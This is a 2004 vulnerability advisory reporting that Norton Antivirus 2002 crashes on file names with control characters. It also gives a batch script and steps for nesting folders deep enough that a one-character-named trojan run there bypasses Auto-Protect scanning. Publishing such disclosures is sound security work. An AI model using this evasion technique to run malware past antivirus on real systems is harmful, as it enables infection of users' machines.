Subject: Norton Antivirus 2002  fails to scan files with special character(s) properly.
Published: Friday, 05 March, 2004

Discovered By: Bipin Gautam ( hUNT3R )
Product Version: Norton Antivirus 2002 [ ver: 8.00.58 ] (~Only tested On...~)
Risk Impact: Low-Medium

*   *   *
Details: 

During a 'manual scan' of a folder, if Norton Antivirus (NAV) encounters a file /folder name with 'some'  ASCII characters ( 1-31) NAV can't further proceed the manual scan and its front-end 'NAVW32.exe' crashes! This Bug has no impact in the NAV Auto-Protect Engine.

Exploit 1). : http://www.geocities.com/visitbipin/test_nav.zip
Create a folder (say: '!' ) and put some sub-folders and files in it. The file/sub-folder name must contain  ASCII character(s)  ( 1-31) . Have a manual scan of the folder named '!' NAV can't  proceed the scan and crashes!

Exploit 2). : Run this batch script, first and make sure you have 95 sub-folders inside the folder named '----------------------------------------------------------------' in c:\ (root)



=-------CUT----------=
@echo off
echo ( you can use, http://www.eicar.org/anti_virus_test_file.htm)
echo for a harmless test... 
pause
cd\
c:
cd\
:hUNT3r 
md 1 
cd 1 
if not errorlevel  1 goto :hUNT3r
:rename
cd\
c:
cd\
ren 1 ----------------------------------------------------------------
explorer c:
exit

=-------CUT----------=

Now... drag/drop a trojan named 1.exe (that NAV recognises as a hostile program) to the 93'rd sub-folder and execute the program from there........ NAV-AUTO PROTECT is unable to scan/block the program & the trojan gets executed. 

[...THIS TECHNIQUE SHOULD WORK FOR SOME OTHER ANTIVIRUS PRODUCT TOO...]

Make sure the trojan/warm.exe just have a 1 character file-name! when it is executer from 93'rd sub directory! (...Last possible DIRECTORY where the file file can be copied!)
